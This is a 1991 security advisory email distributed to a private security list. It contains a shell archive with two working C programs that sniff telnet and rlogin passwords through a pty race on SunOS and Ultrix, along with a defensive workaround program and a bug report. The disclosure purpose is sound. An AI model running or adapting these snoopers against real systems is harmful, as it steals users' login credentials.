@@ -1,0 +1,557 @@
+
+Subject: telnetd/rlogind snooper
+Date: Mon, 25 Mar 91 10:00:21 PST
+
+This is an urgent message that has been sent to all CORE security
+list members, NOT TO THE LARGER MORE GENERAL ZARDOZ SECURITY LIST.
+Please take all possible steps to guarentee it's secrecy.
+
+PLEASE POST TO:                              core@uninet.cpd.com
+PLEASE SEND EMERGENCY ALERTS TO:   core-emergency@uninet.cpd.com
+PLEASE SEND REQUESTS TO:             core-request@uninet.cpd.com
+
+- --------------------------------------------------------------------
+
+This bug was reported recently to Sun Microsystems, as a problem with rlogind and in.telnetd. Since this is also a generic BSD problem (code derived
+from BSD origions), it seemed appropriate to post here. I have the authors permission to
+post this to the core group only. Do not forward. Sun has developed a fix for
+in.telnetd and this fix is available via Sun Answer Centers or through anonymous ftp to ftp.uu.net in the ~ftp/sun-dist/100125-02.tar.Z. Sun's rlogin
+d
+(SUnOS 4.1) aready included the fix.
+
+Brad Powell
+Sun Microsystems
+Software Security Coordinator.
+
+
+- ----- Begin Included Message -----
+
+>From wswietse@bs.win.tue.nl  Mon Mar 25 09:24:57 1991
+Date: Mon, 25 Mar 91 18:28:30 +0100
+To: bradpowell@Corp
+Subject: generic snooper
+
+This is the generic snooper. Not perfect, but works most of the time
+with Ultrix 4.0, SunOS 4.1 and SunOS 4.0.3. No copyright, but be careful.
+
+Wietse Venema
+
+#! /bin/sh
+# This is a shell archive.  Remove anything before this line, then unpack
+# it by saving it into a file and typing "sh file".  To overwrite existing
+# files, type "sh file -c".  You can also feed this as standard input via
+# unshar, or by typing "sh <file", e.g..  If this archive is complete, you
+# will see the following message at the end:
+#"End of shell archive."
+# Contents:  b.c c.c kluge.c makefile report
+PATH=/bin:/usr/bin:/usr/ucb ; export PATH
+if test -f b.c -a "${1}" != "-c" ; then
+  echo shar: Will not over-write existing file \"b.c\"
+else
+echo shar: Extracting \"b.c\" \(3180 characters\)
+sed "s/^X//" >b.c <<'END_OF_b.c'
+X /*
+X  * This program snoops login/password information from network logins
+X  * (telnet and BSD4.3 rlogin are susceptible to this problem). It was tested
+X  * on RISC-based hardware running Ultrix 4.0, SunOS 4.0.3c and SunOS 4.1. It
+X  * probably works with many other BSD-like UNIX dialects.
+X  *
+X  * Operation:
+X  *
+X  * The program opens a pty slave, waits until a network daemon opens the
+X  * master.
+X  *
+X  * It reads the login name, stuffs it back into the input queue and waits until
+X  * /bin/login has read it, then does the same with the password.
+X  *
+X  * There are some race conditions, but the program will work most of the time
+X  * on a lightly loaded system.
+X  *
+X  * Usage: with "who", look for the first free pty, then:
+X  *
+X  * % a.out first-free-pty &
+X  *
+X  * % telnet localhost
+X  *
+X  * With BSD 4.3 rlogin the first thing to pass through the pty will be the
+X  * password. Thus, rlogin is vulnerable to the same problem.
+X  */
+X
+X#include <stdio.h>
+X#include <signal.h>
+X#include <fcntl.h>
+X#include <sys/types.h>
+X#include <sgtty.h>
+X
+Xint     readandpush(f, string)
+XFILE   *f;
+Xchar   *string;
+X{
+X    struct sgttyb sgttyb;
+X    long    l;
+X
+X    /* Snoop a string. */
+X
+X    if (fgets(string, BUFSIZ, f) == 0) {
+Xperror("fgets()");
+Xexit(1);
+X    }
+X    /* Turn echo off. */
+X
+X    if (ioctl(fileno(f), TIOCGETP, &sgttyb))
+Xperror("TIOCGETP");
+X    sgttyb.sg_flags &= ~ECHO;
+X    if (ioctl(fileno(f), TIOCSETN, &sgttyb))
+Xperror("TIOCSETN");
+X
+X    /* Push back what we just read. */
+X
+X    while (*string)
+Xif (ioctl(fileno(f), TIOCSTI, string++))
+X    perror("TIOCSTI");
+X
+X    /* Wait until the stuffed-back input has been read by /bin/login. */
+X
+X    do {
+Xusleep(1000L);
+Xif (ioctl(fileno(f), FIONREAD, &l)) {
+X    perror("FIONREAD");
+X    exit(1);
+X}
+X    } while (l > 0);
+X}
+X
+Xmain(argc, argv)
+Xint     argc;
+Xchar  **argv;
+X{
+X    char    login[BUFSIZ];
+X    char    password[BUFSIZ];
+X    FILE   *f;
+X
+X    signal(SIGQUIT, SIG_IGN);
+X    signal(SIGINT, SIG_IGN);
+X    signal(SIGTERM, SIG_IGN);
+X    signal(SIGHUP, SIG_IGN);
+X    signal(SIGTTOU, SIG_IGN);
+X    signal(SIGTTIN, SIG_IGN);
+X
+X    close(0);
+X
+X    if (argc != 2) {
+Xfprintf(stderr, "usage: %s /dev/tty[p-s][0-f]\n", argv[0]);
+Xexit(1);
+X    }
+X    /* Disconnect from controlling terminal. */
+X
+X    if ((f = fopen("/dev/tty", "r")) < 0) {
+Xperror("/dev/tty 1");
+Xexit(1);
+X    }
+X    if (ioctl(fileno(f), TIOCNOTTY, 0)) {
+Xperror("TIOCNOTTY");
+Xexit(1);
+X    }
+X    fclose(f);
+X
+X    /* Open pty (slave) so it becomes our controlling terminal */
+X
+X    if ((f = fopen(argv[1], "r")) == 0) {
+Xperror(argv[1]);
+Xexit(2);
+X    }
+X    /* Read login name and stuff it back */
+X
+X    readandpush(f, login);
+X
+X    /* Read password and push it back */
+X
+X    readandpush(f, password);
+X
+X    printf("login: %spassword: %s", login, password);
+X}
+X
+X/* Some systems don't have usleep() */
+X
+X#include <sys/time.h>
+X
+Xextern int errno;
+X
+Xnoop()
+X{
+X}
+X
+Xusleep(t)
+Xlong    t;
+X{
+X    struct itimerval delay;
+X    int     err = errno;
+X
+X    delay.it_interval.tv_sec = 0;
+X    delay.it_interval.tv_usec = 0;
+X    delay.it_value.tv_sec = 0;
+X    delay.it_value.tv_usec = t;
+X
+X    signal(SIGALRM, noop);
+X    setitimer(ITIMER_REAL, &delay, (struct itimerval *) 0);
+X    pause();
+X    errno = err;
+X}
+X
+END_OF_b.c
+if test 3180 -ne `wc -c <b.c`; then
+    echo shar: \"b.c\" unpacked with wrong size!
+fi
+# end of overwriting check
+fi
+if test -f c.c -a "${1}" != "-c" ; then
+  echo shar: Will not over-write existing file \"c.c\"
+else
+echo shar: Extracting \"c.c\" \(3408 characters\)
+sed "s/^X//" >c.c <<'END_OF_c.c'
+X /*
+X  * This program snoops login/password information from network logins
+X  * (telnet and BSD4.3 rlogin are susceptible to this problem). It was tested
+X  * on RISC-based hardware running Ultrix 4.0, SunOS 4.0.3c and SunOS 4.1. It
+X  * probably works with many other BSD-like UNIX dialects.
+X  *
+X  * Operation:
+X  *
+X  * The program opens a pty slave, waits until a network daemon opens the
+X  * master, then approaches the pty through /dev/tty.
+X  *
+X  * It reads the login name, stuffs it back into the input queue and waits until
+X  * /bin/login has read it, then does the same with the password.
+X  *
+X  * There are some race conditions, but the program will work most of the time
+X  * on a lightly loaded system.
+X  *
+X  * Usage: with "who", look for the first free pty, then:
+X  *
+X  * % a.out first-free-pty &
+X  *
+X  * % telnet localhost
+X  *
+X  * With BSD 4.3 rlogin the first thing to pass through the pty will be the
+X  * password. Thus, rlogin is vulnerable to the same problem.
+X  */
+X
+X#include <stdio.h>
+X#include <signal.h>
+X#include <fcntl.h>
+X#include <sys/types.h>
+X#include <sgtty.h>
+X
+Xint     readandpush(f, string)
+XFILE   *f;
+Xchar   *string;
+X{
+X    struct sgttyb sgttyb;
+X    long    l;
+X
+X    /* Snoop a string. */
+X
+X    if (fgets(string, BUFSIZ, f) == 0) {
+Xperror("fgets()");
+Xexit(1);
+X    }
+X    /* Turn echo off. */
+X
+X    if (ioctl(fileno(f), TIOCGETP, &sgttyb))
+Xperror("TIOCGETP");
+X    sgttyb.sg_flags &= ~ECHO;
+X    if (ioctl(fileno(f), TIOCSETN, &sgttyb))
+Xperror("TIOCSETN");
+X
+X    /* Push back what we just read. */
+X
+X    while (*string)
+Xif (ioctl(fileno(f), TIOCSTI, string++))
+X    perror("TIOCSTI");
+X
+X    /* Wait until the stuffed-back input has been read by /bin/login. */
+X
+X    do {
+Xusleep(1000L);
+Xif (ioctl(fileno(f), FIONREAD, &l)) {
+X    perror("FIONREAD");
+X    exit(1);
+X}
+X    } while (l > 0);
+X}
+X
+Xmain(argc, argv)
+Xint     argc;
+Xchar  **argv;
+X{
+X    char    login[BUFSIZ];
+X    char    password[BUFSIZ];
+X    FILE   *f;
+X
+X    signal(SIGQUIT, SIG_IGN);
+X    signal(SIGINT, SIG_IGN);
+X    signal(SIGTERM, SIG_IGN);
+X    signal(SIGHUP, SIG_IGN);
+X    signal(SIGTTOU, SIG_IGN);
+X    signal(SIGTTIN, SIG_IGN);
+X
+X    close(0);
+X
+X    if (argc != 2) {
+Xfprintf(stderr, "usage: %s /dev/tty[p-s][0-f]\n", argv[0]);
+Xexit(1);
+X    }
+X    /* Disconnect from controlling terminal. */
+X
+X    if ((f = fopen("/dev/tty", "r")) == 0) {
+Xperror("/dev/tty 1");
+Xexit(1);
+X    }
+X    if (ioctl(fileno(f), TIOCNOTTY, 0)) {
+Xperror("TIOCNOTTY");
+Xexit(1);
+X    }
+X    fclose(f);
+X
+X    /* Open pty so it becomes our controlling terminal */
+X
+X    if ((f = fopen(argv[1], "r")) == 0) {
+Xperror(argv[1]);
+Xexit(2);
+X    }
+X
+X    /*
+X     * Approach pty through /dev/tty. We no longer need the handle to the pty
+X     * slave.
+X     */
+X
+X    if ((f = fopen("/dev/tty", "r")) == 0) {
+Xperror("/dev/tty 2");
+Xexit(2);
+X    }
+X    /* Read login name and stuff it back */
+X
+X    readandpush(f, login);
+X
+X    /* Read password and push it back */
+X
+X    readandpush(f, password);
+X
+X    printf("login: %spassword: %s", login, password);
+X}
+X
+X/* Some systems don't have usleep() */
+X
+X#include <sys/time.h>
+X
+Xextern int errno;
+X
+Xnoop()
+X{
+X}
+X
+Xusleep(t)
+Xlong    t;
+X{
+X    struct itimerval delay;
+X    int     err = errno;
+X
+X    delay.it_interval.tv_sec = 0;
+X    delay.it_interval.tv_usec = 0;
+X    delay.it_value.tv_sec = 0;
+X    delay.it_value.tv_usec = t;
+X
+X    signal(SIGALRM, noop);
+X    setitimer(ITIMER_REAL, &delay, (struct itimerval *) 0);
+X    pause();
+X    errno = err;
+X}
+X
+END_OF_c.c
+if test 3408 -ne `wc -c <c.c`; then
+    echo shar: \"c.c\" unpacked with wrong size!
+fi
+# end of overwriting check
+fi
+if test -f kluge.c -a "${1}" != "-c" ; then
+  echo shar: Will not over-write existing file \"kluge.c\"
+else
+echo shar: Extracting \"kluge.c\" \(905 characters\)
+sed "s/^X//" >kluge.c <<'END_OF_kluge.c'
+X /*
+X  * Kluge to work around login/password snooper. This program just
+X  * opens/closes the first five free pty masters.
+X  */
+X
+X#include <sys/types.h>
+X#include <sys/stat.h>
+X#include <fcntl.h>
+X#include <sys/ioctl.h>
+X
+X#defineMINFREE5/* Amount of free ptys to check */
+X
+Xmain()
+X{
+X    int     i,
+X            p;
+X    int     c;
+X    char   *line;
+X    int     free;
+X    int     fd;
+X
+X    (void) close(0);
+X    (void) close(1);
+X    (void) close(2);
+X
+X    for (;;) {
+Xfor (free = 0, c = 'p'; free < MINFREE && c <= 's'; c++) {
+X    struct stat stb;
+X
+X    line = "/dev/ptyXX";
+X    line[strlen("/dev/pty")] = c;
+X    line[strlen("/dev/ptyp")] = '0';
+X    if (stat(line, &stb) < 0)
+Xbreak;
+X    for (i = 0; free < MINFREE && i < 16; i++) {
+Xline[sizeof("/dev/ptyp") - 1] = "0123456789abcdef"[i];
+Xp = open(line, O_RDONLY);
+Xif (p >= 0) {
+X    free++;
+X    close(p);
+X}
+X    }
+X    (void) sleep(5);
+X}
+X    }
+X}
+END_OF_kluge.c
+if test 905 -ne `wc -c <kluge.c`; then
+    echo shar: \"kluge.c\" unpacked with wrong size!
+fi
+# end of overwriting check
+fi
+if test -f makefile -a "${1}" != "-c" ; then
+  echo shar: Will not over-write existing file \"makefile\"
+else
+echo shar: Extracting \"makefile\" \(201 characters\)
+sed "s/^X//" >makefile <<'END_OF_makefile'
+XFILES= b.c c.c kluge.c makefile report
+XCFLAGS= -g
+X
+Xall: b c kluge
+X
+Xb:b.c
+Xcc -o $@ $(CFLAGS) $?
+X
+Xc:c.c
+Xcc -o $@ $(CFLAGS) $?
+X
+Xkluge:kluge.c
+Xcc -o $@ $(CFLAGS) $?
+X
+Xshar:$(FILES)
+X@shar $(FILES)
+END_OF_makefile
+if test 201 -ne `wc -c <makefile`; then
+    echo shar: \"makefile\" unpacked with wrong size!
+fi
+# end of overwriting check
+fi
+if test -f report -a "${1}" != "-c" ; then
+  echo shar: Will not over-write existing file \"report\"
+else
+echo shar: Extracting \"report\" \(2643 characters\)
+sed "s/^X//" >report <<'END_OF_report'
+XThis message is a followup to an earlier report of a SunOS specific
+Xlogin/password snooper.
+X
+XIt describes how the same security hole can be exploited with many
+Xother BSD-derived UNIX dialects. In other words, I have spent some
+Xtime producing a more portable version of the snooper.
+X
+XBecause of its security implications I have not sent the following
+Xinformation to the comp.bugs.4bsd newgroup.
+X
+XPlease pass it on to the developers at Berkeley, DEC etcetera. Sun
+Xknows about the problem and has already provided us with a fix.
+X
+XWietse Venema
+XEindhoven University of Technology
+XThe Netherlands
+X
+XProblem:
+X
+Xlogin information can be snooped from telnet logins (and
+Xprobably also from BSD4.3 rlogins). I have included sample
+Xprograms that successfully exploit this feature on RISC-based
+Xhardware running SunOS 4.0.3c, SunOS 4.1 and with Ultrix 4.0.
+X
+XIt is likely that they will work with many other BSD-like UNIX
+Xdialects.
+X
+XDescription:
+X
+XI have included two programs (b.c and c.c) that do the
+Xfollowing:
+X
+X- Open pty slave. This will block until the master side is
+Xopened by a telnet daemon.
+X
+X- Read login name, stuff it back using the TIOCSTI ioctl(), and
+Xwait until /bin/login has read it.  Do the same with the password.
+X
+X- Write the result to stdout and terminate.
+X
+XOne program (b.c) directly reads the pty slave, the other one
+X(c.c) reads through /dev/tty.
+X
+XWith the BSD4.3 rlogin, the first thing to pass through the pty
+Xwill be the password. Therefore, rlogins can be exploited as well.
+X
+XRepeat by:
+X
+XCompile the b.c and c.c programs. In the examples I will
+Xuse the generic name `a.out' for the resulting executables.
+X
+XWith who(1), locate the first unused pty slave. Then:
+X
+X% a.out first-free-pty-slave &
+X% telnet localhost
+X
+XNote that your login name and password will be displayed
+Xby the a.out program.
+X
+XThere are some race conditions, but the programs work most of
+Xthe time on lightly-loaded systems.
+X
+XFix:
+X
+XFirst I tried to modify the BSD4.3 telnetd/rlogind daemon code
+Xso that it would open the pty master, close it, then open it
+Xagain. This took care the snooper that directly read the pty
+Xslave, but the version that directly read /dev/tty would still
+Xwork some of the time (at least SunOS 4.1, I did not try other
+XUNIX dialects).  I was not able to find a generic fix to the
+Xlatter problem.
+X
+XWorkaround:
+X
+XRun the kluge program that is provided with this message. It
+Xopens, at regular intervals, the first five free ptys and
+Ximmediately closes them. This seems to take care of both
+Xversions of the snooper programs. I have verified this with
+XRISC-based versions of Ultrix 4.0 and SunOS 4.1.
+X
+END_OF_report
+if test 2643 -ne `wc -c <report`; then
+    echo shar: \"report\" unpacked with wrong size!
+fi
+# end of overwriting check
+fi
+echo shar: End of shell archive.
+exit 0
+
+
+- ----- End Included Message -----
+
+[.log] 441) 
